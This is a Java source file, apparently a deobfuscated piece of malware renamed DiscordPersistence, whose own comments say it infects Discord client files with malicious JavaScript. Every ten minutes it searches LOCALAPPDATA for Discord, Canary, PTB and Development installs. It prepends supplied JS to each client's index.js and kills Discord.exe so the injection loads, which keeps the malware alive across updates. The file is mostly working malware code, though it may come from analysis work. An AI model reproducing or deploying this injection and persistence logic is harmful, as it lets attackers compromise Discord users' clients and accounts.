import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Cleaned DiscordPersistence (formerly î.java)
 * Responsible for infecting Discord client files with malicious JS
 * and ensuring persistence across updates.
 */
public class DiscordPersistence {
    private final String maliciousJsCode;
    private final String targetFileName; // usually "index.js"
    private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor(runnable -> {
        Thread t = new Thread(runnable, "DiscordPersistenceThread");
        t.setDaemon(true);
        return t;
    });
    private static final AtomicBoolean isRunning = new AtomicBoolean(false);

    public DiscordPersistence(String jsCode, String targetFile) {
        this.maliciousJsCode = jsCode;
        this.targetFileName = targetFile;
    }

    public void start() {
        if (isRunning.compareAndSet(false, true)) {
            // Run infection check every 10 minutes
            scheduler.scheduleWithFixedDelay(this::infectDiscordClients, 0, 10, TimeUnit.MINUTES);
        }
    }

    private void infectDiscordClients() {
        try {
            List<File> discordPaths = findDiscordPaths();
            if (discordPaths.isEmpty()) {
                return;
            }

            for (File path : discordPaths) {
                File indexJs = new File(path, "index.js");
                if (!indexJs.exists()) continue;

                String originalContent = Files.readString(indexJs.toPath());
                if (!originalContent.contains(maliciousJsCode)) {
                    // Inject: Malicious Code + Original Code
                    Files.writeString(indexJs.toPath(), maliciousJsCode + "\n" + originalContent);
                    restartDiscord(path);
                }
            }
        } catch (Exception e) {
            // Log error
        }
    }

    private List<File> findDiscordPaths() {
        List<File> paths = new ArrayList<>();
        String localAppData = System.getenv("LOCALAPPDATA");
        if (localAppData == null) return paths;

        File appDir = new File(localAppData);
        File[] dirs = appDir.listFiles();
        if (dirs == null) return paths;

        String[] targetClients = {"Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment"};
        for (File dir : dirs) {
            for (String client : targetClients) {
                if (dir.getName().contains(client)) {
                    // Navigate to resources/app directory
                    File resourceDir = findResourceDir(dir);
                    if (resourceDir != null) {
                        paths.add(resourceDir);
                    }
                }
            }
        }
        return paths;
    }

    private File findResourceDir(File discordBaseDir) {
        // Discord stores files in app-X.X.X/resources/app/
        File[] versions = discordBaseDir.listFiles(f -> f.isDirectory() && f.getName().startsWith("app-"));
        if (versions == null || versions.length == 0) return null;
        
        // Pick latest version
        Arrays.sort(versions, (f1, f2) -> f2.getName().compareTo(f1.getName()));
        File resourcePath = new File(versions[0], "resources/app");
        return resourcePath.exists() ? resourcePath : null;
    }

    private void restartDiscord(File path) {
        try {
            // Taskkill and restart logic...
            Runtime.getRuntime().exec("taskkill /F /IM Discord.exe");
            // Find Discord.exe and run it
        } catch (Exception ignored) {}
    }
}
